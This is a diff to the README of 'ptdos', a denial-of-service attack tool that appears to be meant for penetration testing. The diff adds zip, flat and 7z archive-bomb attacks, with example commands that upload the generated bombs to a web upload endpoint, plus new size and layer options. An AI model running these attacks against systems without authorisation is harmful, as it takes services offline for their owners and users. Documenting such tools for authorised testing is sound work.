@@ -20,6 +20,9 @@ Application ptdos is used for creation of Denial of Service attacks. It is part 
 * Ping of Death
 * Slowloris
 * R.U.D.Y. - Are You Down Yet?
+* Zip Bomb
+* Flat Bomb
+* 7z Bomb
 ### Amplification DoS attacks
 * Smurf Attack
 * NTP Amplification
@@ -40,6 +43,8 @@ Application ptdos is used for creation of Denial of Service attacks. It is part 
 * validators
 * impacket
 * setuptools
+* numpy
+* py7zr
 
 ### Installation using pip
 
@@ -126,6 +131,18 @@ $ ptdos -a slowloris -d 5 -dst "http://192.168.0.80" -dp 80 -sq 10 -st 5
 ```
 $ ptdos -a rudy -dst "http://192.168.0.80" -dp 80 -d 5 -st 10
 ```
+**Zip Bomb**
+```
+$ ptdos -a zipbomb -ds 1 -l 5 -c 5 -dst http://192.168.0.80/upload.php -o mini.zip
+```
+**Flat Bomb**
+```
+$ ptdos -a flatbomb -ks 1 -c 5 -dst http://192.168.0.80/upload.php -o mini.zip
+```
+**7z Bomb**
+```
+$ ptdos -a sevenbomb -ds 1 -l 5 -c 5 -dst http://192.168.0.80/upload.php -o mini.7z
+```
 
 ### Options
 Not all options can be used with every attack. Check the help for each attack by running ptdos.py -h.
@@ -142,6 +159,11 @@ Not all options can be used with every attack. Check the help for each attack by
 -body   --body              Specify body of the request
 -qs     --query-string      Specify query string of the request like "par1=val1&par2=val2"
 -j      --json              Make JSON output
+-ds     --dummy-size        Size of the first generated file dummy file in MB
+-l      --layers            Ammount of layers
+-c      --copies            Ammount of archives in one layer
+-o      --output            Specify output for saving locally
+-ks     --kernel-size       Size of the uncompressed kernel MB
 -v      --version           Show script version and exit
 -h      --help              Show help message and exit
 ```
